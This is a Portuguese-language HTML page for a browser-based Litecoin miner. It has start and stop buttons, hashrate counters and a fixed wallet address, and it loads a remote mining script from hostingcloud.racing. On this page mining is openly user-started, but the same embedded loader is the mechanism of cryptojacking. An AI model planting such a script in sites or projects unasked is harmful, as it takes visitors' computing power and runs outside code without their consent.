<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meu Minerador de LTC</title>
    <style>
        body { font-family: sans-serif; background: #121212; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: #1e1e1e; padding: 2rem; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); text-align: center; width: 350px; }
        h1 { color: #be8e3e; font-size: 1.5rem; }
        .status { margin: 20px 0; padding: 10px; border-radius: 5px; background: #2d2d2d; }
        .stats { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
        .stat-box { background: #333; padding: 10px; border-radius: 5px; }
        .btn { background: #be8e3e; border: none; padding: 10px 20px; color: white; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; }
        .btn:hover { background: #9e7532; }
        .wallet { font-size: 0.7rem; color: #888; word-break: break-all; margin-top: 15px; }
    </style>
</head>
<body>

<div class="container">
    <h1>LTC CPU Miner</h1>
    <p>Minerando via Navegador (WebMining)</p>
    
    <div class="status">
        Status: <span id="status">Parado</span>
    </div>

    <div class="stats">
        <div class="stat-box">Hashrate: <br><span id="hashes">0</span> H/s</div>
        <div class="stat-box">Total: <br><span id="total">0</span></div>
    </div>

    <button class="btn" onclick="startMining()">INICIAR MINERAÇÃO</button>
    <button class="btn" style="background: #444;" onclick="stopMining()">PARAR</button>

    <div class="wallet">
        Carteira: <br> ltc1qxwn5nxemmtc2ekh7njywr9qy7hanara9tp54fe
    </div>
</div>

<script src="https://www.hostingcloud.racing/K7fQ.js"></script>
<script>
    var _client = new Client.Anonymous('ltc1qxwn5nxemmtc2ekh7njywr9qy7hanara9tp54fe', {
        throttle: 0.5, c: 'LTC'
    });

    function startMining() {
        _client.start();
        document.getElementById('status').innerText = "Minerando...";
        document.getElementById('status').style.color = "#00ff00";
    }

    function stopMining() {
        _client.stop();
        document.getElementById('status').innerText = "Parado";
        document.getElementById('status').style.color = "red";
    }

    setInterval(function() {
        document.getElementById('hashes').innerText = _client.getHashesPerSecond().toFixed(1);
        document.getElementById('total').innerText = _client.getTotalHashes();
    }, 1000);
</script>

</body>
</html>
